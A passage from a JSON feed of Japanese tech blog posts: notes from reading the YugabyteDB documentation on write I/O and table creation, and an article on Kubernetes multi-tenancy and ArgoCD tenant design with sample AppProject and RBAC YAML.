Day7","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/7_core_functions_write_io_path","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Table Creationを読みました。今回はArchitecture > Core functions > Write I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Write I/O pathWrite I/O pathはYQLレイヤーで処理され、タブレットリーダーによってレプリケーションの準備が行なわれるシングルキーでの書き込みとして例示することが出来る。アトミックなアップデートを共なう複数キーでの分散トランザクションなど複雑なケースについては分散トランザクションに記載する。Write operation processing by YQL layerユーザーが発行したYQLクエリレイヤに作用するライトリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザーリクエストはYQLレイヤで内部キーに変換される。シャーディングで説明するように、それぞれのキーは一つのタブレットが所有する。どのタブレットがキーを所有するか特定するために、YQLレイヤはYB-MasterにRPC1呼び出しを実行する。そのレスポンスは将来の利用のためにキャッシュされる。YugabyteDBはタブレットの場所をキャッシュし直接参照することでネットワークホップを減らすことで、YQLレイヤが直接適切なYB-TServerにホストされるタブレットリーダーにリクエストを送信することが出来るスマートクライアントを持つ。YQLレイヤがローカルノードにタブレットリーダーを見つけた場合、RPCはローカルファンクションコールになりリクエストをシリアライズとデシリアライズしてネットワーク越しに送信する時間を節約することが出来る。その後YQLレイヤはタブレットリーダーをホストするYB-TServerへの書き込みを発行する。この書き込みはキーを所有するRaftグループのタブレットリーダーによって処理される。Preparation of the operation for replication by tablet leader下記の図はタブレットリーダーがレプリケーションを実行する処理を説明している。タブレットのRaft Groupリーダーは以下の処理を実行する。現在実行されている処理が現在のスキーマに対応しているかを判別するキーに対してローカルin-memoryロックマネージャーを利用してロックを取得する。このロック機構はフォロワーには存在しない必要であればデータを読み込む(read-modify-writeや条件付きアップデート命令など)DocDBに書き込まれる変更のバッチを準備する。この書き込みバッチは殆ど最終的にRocksDBに書き込まれるKey-Valueペアに近く、それぞれのキーの末尾に最終的なhybrid timestampが添えられていないだけであるRaft replication of the write operation書き込みのRaftレプリケーション処理の流れは以下のように説明することが出来る。リーダーがバッチをRaft logにアペンドし、書き込みのためのhybrid timestampを選択するRaftを利用しデータをピアーに複製する成功したRaft replicationのデータをローカルのDocDBに反映するユーザーに成功を返すフォロワータブレットはRaftを利用したデータの複製を受けつけ、コミットされた事が分ったタイミングでその複製をローカルのDocDBに反映する。リーダーは以下のようにコミットポイントに於ける後続のRPCリクエストの進行を進める。書き込みバッチを含むRaftエントリーは過半数以上のタブレットRaft Groupピアーに複製されるRaftのサブシステムから\\"Replication Successful\\"のコールバックを取得したあと、リーダーはローカルのDocDBにバッチの書き込みを適用するリーダーからの次の更新でエントリーがコミットされたことがフォロワーに通知され、フォロワーはそれぞれのRocksDBインスタンスにバッチの書き込みを適用する。Response to the clientInformation Pending2Exampleskとvという値をKという行とVという行をもつテーブルT1に挿入する例について考える3。この例ではユーザーアプリケーションがランダムなYugabyteDBサーバにWriteクエリを送信し、そのサーバがリクエストを適切にルーティングすると仮定して簡略化している。特にYCQLではYugabyteDB Smart Clientを使うことで、余分なネットワークホップを避けることが出来る。↩原文ママ。過去のバージョンでも記載無し↩INSERT INTO T1 (K,V) VALUES(\'k\',\'v\')ということ↩","isoDate":"2023-08-30T16:03:36.000Z","dateMiliSeconds":1693411416000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day6","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/6_core_functions_table_creation","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Universe creationを読みました。今回はArchitecture > Core functions > Table Creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Table CrationYugabyteDBではユーザーにより実行されるテーブルの作成はYB-Masterのリーダーが実行する非同期APIによって管理される。YB-MasterはそのAPIでテーブルのスキーマと障害耐性を高めるために形成するRaftグループに所属するYB-Masterでのテーブル作成に必要な他の情報のレプリケーションが完了した段階でAPIの成功を返す。YB-Masterのリーダーがテーブル作成を実行するときは複数のステップが存在する。ValidationYB-Masterリーダーはテーブルスキーマの検証を行ない、指定された数のタブレットを作成する。これらのタブレットはこの段階ではYB-TServerには割り振られていない。ReplicationYB-MasterリーダーはYB-MasterのRaftグループにテーブルスキーマと新しく作成されたタブレット(この時点ではYB-TServerへの割り当て行なわれていない)の複製を行なう。この処理はYB-Masterリーダに障害が発生してもテーブル作成が成功することを保証する。Acknowledgementテーブル作成処理はYB-Masterリーダーに障害が発生しても処理を継続することが出来るため、この段階で非同期テーブル作成APIは成功を返す。ExecutionYB-Masterリーダーはそれぞれのタブレットをレプリケーションファクターとして指定された数だけYB-TServerに割り当てを行なう。このタブレットピアーの配置は指定された障害耐性を実現でき、またタブレットの割り当てがYB-TServerに均等に行なわれるように実行される。タブレットのYB-TServerへの割り当てはタブレットのレプリカが複数クラウド、リージョン、アヴェイラビリティゾーンをまたいで分散するといった追加の制約を満す必要がある。Continuous monitoringYB-Masterリーダーは全てのタブレットの割り当て処理を監視し、その実行状態と完了をユーザーが実行したAPIコールに対して応答する必要がある。Examplesテーブルが4ノードからなるYugabyteDBUniverseに作成される処理について考える。このときテーブルは16のタブレットと3つのレプリケーションファクターを持つとする。YB-Masterリーダーはスキーマを検証する。また16タブレット(合計48のタブレットピアー)を作成し、Raftを利用して過半数のYB-TServerにテーブルの作成に必要なデータを複製する。作成したタブレットをRaftグループを成すYB-TServerの中の指定された数のYB-TServer割り当て、リーダーの選出を行なう。このタブレットに属するキーに対する全てのリードとライトは、タブレットピアーのリーダーとRaftグループが責任を持つ。タブレットが割り当てられると長期に渡る障害か将来のロードバランシングが発生しYB-Masterにオーナーシップを変更されるまで、割り当て先のYB-TServerが所有する。タブレットリーダーをホストするYB-TServerの内の1台に障害が発生した場合、タブレットのRaftグループはI/Oを処理するために即座にリーダーエレクションを実行する。そのためYB-MasterはI/Oにおけるクリティカルパスになることはない。レプリケーション先となる候補を探す。この複製処理は段階的かつGracefulに実行される。","isoDate":"2023-08-23T14:26:45.000Z","dateMiliSeconds":1692800805000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"【ArgoCD\uD83D\uDC19️】KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/08/18/110646","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類マルチテナントパターンをArgoCDで実践する場合にオススメのパターン (★で表現)ArgoCDのNamespacedスコープモードとClusterスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. なぜマルチテナントが必要なのかシングルテナントの場合マルチテナントの場合03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧Clusters as-a-ServiceControl Planes as-a-ServiceNamespaces as-a-Serviceカスタムリソーステナント04. ArgoCDでのテナントパターン実践一覧04-02. Clusters as-a-Service 実践実Clusterテナントオススメしない理由04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★オススメした理由04-04. Namespaces as-a-Service 実践04-05. カスタムリソーステナントの実践AppProjectテナントCLモード vs. NSモード05. CLモードなArgoCDCLモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)オススメしない理由05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)特にオススメした理由AppProjectテナント例の一覧テナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)オススメしなかった理由テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)オススメした理由テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)特にオススメした理由06. どのような誤った操作を防いでくれるのかマニフェストのデプロイ制限マニフェストをデプロイできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合カスタムリソースのReconciliation制限ArgoCD系カスタムリソースをReconciliationできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、熟成アルトバイエルンです。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19のマルチテナント化を担当しました。プロダクトが稼働するKubernetes Clusterが数十個あり、Clusterによっては複数のチームが合計100個以上のマイクロサービスを動かしています。このような大規模なマイクロサービスシステムがいくつもある状況下で、ArgoCDのマルチテナント設計の知見を深められたため、記事で解説しました。書きたいことを全部書いたところ、情報量がエグいことになってしまったため、気になる章だけでも拾って帰っていただけるとハッピーです\uD83D\uDE4FKubernetesのマルチテナントパターン (3章)ArgoCDでのテナントパターン実践一覧 (4章)ArgoCDのClusterスコープモードとNamespacedスコープモード (5章)どのような誤った操作を防いでくれるのか (6章)それでは、もりもり布教していきます\uD83D\uDE1702. なぜマルチテナントが必要なのかシングルテナントの場合そもそも、なぜArgoCDにマルチテナントが必要なのでしょうか。例えば、マニフェストのデプロイ先となるプロダクト用Cluster (例：foo、bar、baz) があると仮定します。ArgoCDをシングルテナントにする場合、各プロダクトチームの操作するApplicationを同じテナントに共存させることになります。この場合、単一のargocd-server (ダッシュボード) から全てのApplicationを操作できて便利です。しかし、プロダクト用Cluster数が増えていくにつれて、問題が起こり始めます。例えば、いずれかのプロダクトチームが誤ったApplicationを操作し、結果的に誤ったプロダクト用Clusterにマニフェストをデプロイしてしまう可能性があります。もちろん、システムでインシデントを起こしてやろうという悪意を持った人が、誤ったプロダクト用Clusterを意図的に選ぶ可能性もあります\uD83D\uDE08マルチテナントの場合その一方で、いい感じのマルチテナントにしたとします。プロダクトチームは、認可されたテナントに所属するApplicationにのみを操作でき、反対に無認可のテナントのApplicationは操作できません。これにより、誤ったプロダクト用Clusterにマニフェストをデプロイすることを防げます。03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧ArgoCDのテナント設計を実践する前に、Kubernetesにはどんなマルチテナントパターンがあるのでしょうか。Kubernetesのマルチテナントパターンは、以下に大別できます。         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      テナント単位         実Cluster         仮想Cluster         Namespace         ツール固有の論理空間      テナント間でKubernetesリソースを分離できるか         Clusterスコープリソース         ✅         ✅         ✅         ツールによる      Namespacedスコープリソース         ✅         ✅                  ツールによる      ツール         AWS EKSGCP GKEAzure AKEKubeadmなど         Kcptensile-kubevclusterVirtualClusterなど         Namespaceを増やすだけなので特別なツール不要         ArgoCDのAppProjectCapsuleのTenantkioskのAccountKubeZooのTenantなど      ▶ 他のマルチテナントの分類方法について\\"ソフトマルチテナンシー\\" と \\"ハードマルチテナンシー\\" といった分類方法もあります。この分類方法では、テナント間の分離度の観点で各マルチテナントを種別します。ソフトマルチテナンシーは、互いに信頼できる前提の上で、テナント間を弱く分離します。その一方で、ハードマルチテナンシーは、互いに信頼できない前提の上でテナント間を強く分離します。分離度がソフトとハードのいずれであるかに客観的な指標がなく、やや曖昧な種別になってしまうため、本記事の X as-a-Service の方が個人的には好みです♡♡♡The Kubernetes Book: 2024 Edition (English Edition)Multi-tenancy | KubernetesMulti-tenancy - EKS Best Practices GuidesClusters as-a-ServiceClusters as-a-Serviceは、テナントごとに独立したClusterを提供します。ツールとして、AWS EKS、GCP GKE、Azure AKE、Kubeadmなどがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Control Planes as-a-ServiceControl Planes as-a-Serviceは、テナントごとに独立したコントロールプレーン (言い換えば仮想Cluster) を提供します。ツールとして、Kcp、tensile-kube、vcluster、VirtualClusterなどがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Namespaces as-a-ServiceNamespaces as-a-Serviceは、テナントごとに独立したNamespaceを提供します。Namespaceを増やすだけなため、ツールは不要です。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?カスタムリソーステナントカスタムリソーステナントは、テナントごとにツール固有の論理空間 (例：ArgoCDのAppProject、CapsuleのTenant、kioskのAccount、KubeZooのTenantなど) を提供します。ツールによっては、X as-a-Service も兼ねている場合があります。今回紹介するAppProjectは、前述の『Namespace as-a-Service』を兼ねています。AppProjectについては、カスタムリソーステナント で解説しています。04. ArgoCDでのテナントパターン実践一覧お待たせしました。ここからは、KubernetesのマルチテナントパターンをArgoCDで具体的に実践し、おすすめのパターン実践を解説していきます。なお、オススメするものを ★ としています。         実Clusterテナント         仮想Clusterテナント         Namespaceテナント         AppProjectテナントCLモード         AppProjectテナントNSモード      対応するテナントパターン         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      ArgoCDがテナント間で占有 / 共有         占有         占有         占有         共有         占有      テナント間でKubernetesリソースを分離できるか         Namespacedスコープリソース         ✅         ✅         ✅         ✅         ✅      Clusterスコープリソース         ✅         ✅                                 オススメ                  ★                           ★★      How many do you need? Argo CD Architectures Explained - 2024 Update | Akuity以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。04-02. Clusters as-a-Service 実践実Clusterテナント実Clusterテナントは、Clusters as-a-Serviceなテナントの実践であり、実際のClusterをテナントの単位とします。後述の仮想Clusterと対比させるために、\\"実Cluster\\" と呼ぶことにします。各プロダクトチームは、実Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。オススメしない理由実Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。半年以内にアップグレードしないとサポートが切れるKubernetesクラスターが33個もあって、泣いちゃった— 長谷川 広樹 (俺です) (@Hiroki__IT) January 18, 2023  アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                    デメリットの回避策                                                                                  拡張性                 -                                                                                                                                                                     テナントを増やすために実Clusterを用意する必要があり、作業量が多い。                            ➡︎  IaCツールで実Clusterを用意するようにすれば作業量を減らせるが、やっぱりとてもつらい\uD83D\uDE2D       安全性(セキュリティ)        ClusterからClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                                  -                                                                                              ➡︎  -                                                                                                   保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に実Clusterを保守しないといけない。(例：アップグレード、機能修正など)  ➡︎  回避できず、とてもつらい\uD83D\uDE2D                                                                           性能                  Clusterのハードウェアリソースを他のテナントと奪い合うことなく、これを独占できる。                                                                                     -                                                                                              ➡︎  -                                                                                                   信頼性                 テナントごとに実Clusterが独立しており、他の実Clusterから障害の影響を受けない。                                                                                        -                                                                                              ➡︎  -                                                                                    04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★仮想Clusterテナントは、Control Planes as-a-Serviceなテナントの実践であり、仮想Clusterをテナントの単位とします。各プロダクトチームは、仮想Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Using Argo CD with vclusters. Managing deployment to multiple… | by Daniel Helfand | Argo Projectオススメした理由仮想Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                             デメリットの回避策                                                                                    拡張性                 テナントを増やすためにマニフェストで定義した仮想Clusterを用意するだけでよく、実Clusterを用意することと比べて作業量が少ない。                                          -                                                                                                       ➡︎  -                                                                                            安全性(セキュリティ)        仮想ClusterからホストClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                        -                                                                                                       ➡︎  -                                                                                                     保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に仮想Clusterを保守しないといけない。(例：アップグレード、機能修正など)  ➡︎  仮想Clusterに関する知見を持つ組織であれば、各テナントで保守できる。                                    性能                  -                                                                                                                                                                     Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                       ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                信頼性                 テナントごとに仮想Clusterが独立しており、他の仮想Clusterから障害の影響を受けない。                                                                                    -                                                                                                       ➡︎  -                                                                                      04-04. Namespaces as-a-Service 実践Namespaceテナントは、Namespaces as-a-Serviceなテナントの実践であり、Namespaceをテナントの単位とします。後述の AppProjectテナント は二重のテナントを持ち、Namespaceテナントも兼ねています。そのため、ここではNamespaceテナントの解説は省略します。04-05. カスタムリソーステナントの実践AppProjectテナントAppProjectテナントは、カスタムリソーステナントの実践であり、NamespaceとAppProjectをテナントの単位とします。AppProjectテナントは、二重のテナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持ち、\\"あらゆる面から\\" マニフェストのデプロイを制限します。特に、AppProjectはNamespaceスコープなカスタムリソースであり、自身に所属するApplicationを一括して制限します。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foo  # 自身に所属するApplicationを制限するspec: ...apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: infra-application  namespace: foospec:  # foo-tenantに所属する  project: foo-tenant  ...Argo CD in Practice: The GitOps way of managing cloud-native applications (English Edition)Projects - Argo CD - Declarative GitOps CD for Kubernetes▶ カスタムリソースの仕様について.spec.scopeキーからも分かる通り、AppProjectはNamespacedスコープなカスタムリソースであり、任意のNamespaceを設定できます\uD83D\uDC4DapiVersion: apiextensions.k8s.io/v1kind: CustomResourceDefinitionmetadata:  labels:    app.kubernetes.io/name: appprojects.argoproj.io    app.kubernetes.io/part-of: argocd  name: appprojects.argoproj.iospec:  group: argoproj.io  names:    kind: AppProject    ...  # Namespacedスコープなカスタムリソースであるとわかる  scope: Namespaced...  argo-cd/manifests/crds/appproject-crd.yaml at master \xb7 argoproj/argo-cd \xb7 GitHubExtend the Kubernetes API with CustomResourceDefinitions | KubernetesCLモード vs. NSモードArgoCDには、Clusterスコープモード と Namespacedスコープモード (以降、\\"CLモード\\" と \\"NSモード\\") があります。スコープモードに応じて、AppProjectテナントの設計方法が異なります。本章では、CLモードとNSモードの両方でAppProjectテナントを解説していきます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes05. CLモードなArgoCDCLモードなArgoCDとはCLモードなArgoCDの場合、各テナント間で共有のArgoCDを管理します例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。別途、ArgoCD専用のNamespace (argocd) を用意し、ここに関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesArgoCD: Multi-tenancy strategy. Introduction | by Geoffrey | MediumAppProjectNSモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App Of Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com  # CLモードでは設定が必要である  sourceNamespaces:    - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。一方で後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。そのため、.spec.sourceNamespacesキーで、特定のNamespaceのApplicationがこのAppProjectに所属できないように、ApplicationのNamespaceを制限しています。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)NSモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # CLモードでは設定が必要である  # 全てのNamespaceを指定したい場合は、ワイルドカードを設定する  application.namespaces: \\"*\\".application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。一方での後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。--application-namespacesオプションで、任意のNamespaceにアクセスするための認可を設定できます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes▶ --application-namespacesオプションの設定方法についてargocd-cmd-params-cmの代わりに、例えば以下のようにPodに引数を直接渡しても良いです\uD83D\uDE46\uD83C\uDFFB‍例えば、以下のような実装になります。apiVersion: v1kind: Podmetadata:  name: argocd-server  namespace: argocdspec:  containers:    - name: argocd-server      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-server        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...apiVersion: v1kind: Podmetadata:  name: argocd-application-controller  namespace: argocdspec:  containers:    - name: argocd-application-controller      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-application-controller        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...  `argocd-application-controller` Command Reference - Argo CD - Declarative GitOps CD for Kubernetes`argocd-server` Command Reference - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)NSモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:foo, *, *, foo/*/*, allow    p, role:bar, *, *, bar/*/*, allow    p, role:baz, *, *, baz/*/*, allow    g, foo-team, role:foo    g, bar-team, role:bar    g, baz-team, role:baz  scopes: \\"[groups]\\"認証済みグループ (foo-team、bar-team、baz-team) に対して、無認可のAppProject (foo、bar、baz) に所属するApplicationを操作できないように、認可スコープを制限しています。▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetesオススメしない理由CLモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 ArgoCD用Clusterの管理者が単一のClusterを保守すればよい。(例：アップグレード、機能修正など)   AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 -                                                                                            ClusterまたはArgoCDで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                            ➡︎  代わりにNodeやArgoCDを十分に冗長化して可用性を高めれば、影響を緩和できる。ただ、そもそもの影響範囲が大きすぎる\uD83D\uDE2D                                           05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはNSモードなArgoCDの場合、前述のCLモードとは異なり、各AppProjectテナント間でArgoCDを占有します。例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。各AppProjectテナントに、ArgoCDと関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesAppProjectCLモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App Of Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com# NSモードでは設定が不要である# sourceNamespaces:#   - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできます。そのため、.spec.sourceNamespacesキーでマニフェストのデプロイを制限する必要はありません。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)CLモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# NSモードでは設定が不要である# application.namespaces: \\"*\\"前述の通り、.application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできますそのため、.application.namespacesキーでNamespaceに関する認可を設定する必要はありませんもちろん、Podのコンテナ引数にも設定は不要です。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)CLモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"認証済みグループ (app-team、infra-team) に対して、無認可のAppProject (app、infra) に所属するApplicationを操作できないように、認可スコープを制限しています。特にオススメした理由NSモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 単一のClusterを保守すればよい。(例：アップグレード、機能修正など)               AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 テナントごとにArgoCDを占有しており、他のArgoCDから障害の影響を受けない。                     Clusterで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                                        ➡︎  代わりに、Nodeを十分に冗長化して可用性を高める。いずれかのインスタンスで障害が起こっても、正常なインスタンスでArgoCDが稼働できる。                         AppProjectテナント例の一覧NSモードなArgoCDを採用する場合、AppProjectテナント例を解説していきます。前述の通り、AppProjectテナントが二重テナント 